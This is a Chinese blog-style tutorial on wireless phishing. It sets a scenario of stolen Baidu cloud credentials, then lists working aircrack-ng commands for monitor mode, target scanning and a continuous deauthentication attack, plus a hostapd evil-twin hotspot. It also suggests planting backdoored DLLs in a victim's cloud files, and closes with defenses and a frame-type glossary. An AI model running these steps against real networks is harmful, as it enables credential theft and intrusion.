2020无线钓鱼(3)——Start fishing
2020-02-26 15:45

想定

这是一个简单的想定：

疫情期间，小黄在家无聊地刷着微博。

突然，他看到其中一条微博里写着 美女图片，点击百度云链接收藏。

小黄眼睛一亮， 点击链接 ，浏览器里出现了百度云盘的页面。

小黄选择好文件夹，点击保存，这时，浏览器 跳转到百度云登录界面 。

小黄不假思索地 输入用户名和口令，点击“登录”按钮 后，浏览器却又跳转回登录界面。

这是怎么回事？小黄百思不得其姐。

2个小时后，

小黄的手机里的百度云盘APP之前自动上传到百度云保存的手机通讯录、相册，被流传到网络上。

小黄感觉天旋地转。

断网攻击

设置监听模式

用 airmon-ng设置无线网卡为监听模式

airmon-ng start wlan0

收集目标热点信息

用airodump-ng扫描附近热点，获取目标热点信息（MAC地址，信道）

airodump-ng wlan0

获取目标用户信息

用airodump-ng获取目标用户的信息（MAC地址）

airodump-ng -d  8C:BE:BE:2E:C0:50  -c  3  wlan0

参数注释：

-d 即BSSID (Basic Service Set Identifier)，目标热点的MAC地址

-c 即channel，信道

wlan0 表示选择使用的无线网卡

-w 写入文件

–berlin 定义的时间airodump中-ng的窗口将显示连接至路由器设备的量。默认情况下，设备仅显示120秒。为了进行长期监视，我们将其扩展到任意高的值。

deauth攻击

用aireplay-ng 对目标用户进行deauth攻击

aireplay-ng  -0  0  -a  8C:BE:BE:2E:C0:50  -c  54:B1:21:56:AA:3C  wlan0

参数注释： -0 解除认证攻击（deauth，de-authentication）的次数，设为0表示持续攻击

-a 目标AP的MAC地址

-c 目标用户的MAC地址

wlan0 指定攻击所使用的无线网卡

启动钓鱼热点

启动（或重启）hostapd以创建钓鱼热点

hostapd  /etc/hostapd/open.conf

此时，目标用户的设备（手机）会自动连上我们创建的同名热点。

如何防御

  • 使用WIPS，例如360的天巡
  • 无线热点设备使用IEEE 802.11w协议，可以防止deauth攻击
  • 上网设备不要设置WLAN自动连接

思考

可以造成软件供应链攻击，例如phpstudy的后门事件。把网盘里的软件包下载，替换dll，加入后门等，再上传回受害者百度云，受害者再次下载或共享给别人……

敏感信息：百度网盘同步的通讯录 相册

Beacon：信标帧，无线网络中用来标识无线网络，周期性向周边广播，已通告终端无线网络的存在。相当于一直在喊，我在这，我在这。

ProbeReq：探测请求，终端主动发出来探测周边网络是否有可用无线网络。相当于一直在问，有人吗？

ProbeResp：探测响应，响应探测请求，其内容和Beacon基本一直。相当于在答复，有人啊。

IEEE802.11工作组基于现有的加密方式提出了针对管理帧的保护协议802.11w。

STA和AP能够协同工作吗？可以，目前有这样的技术。

STA：无线终端模式，不断切换信道搜索AP

AP：无线接入点模式，在固定信道等待STA连接及传输数据

AP和monitor能协同工作吗？一般不能，不排除有手段可以实现。
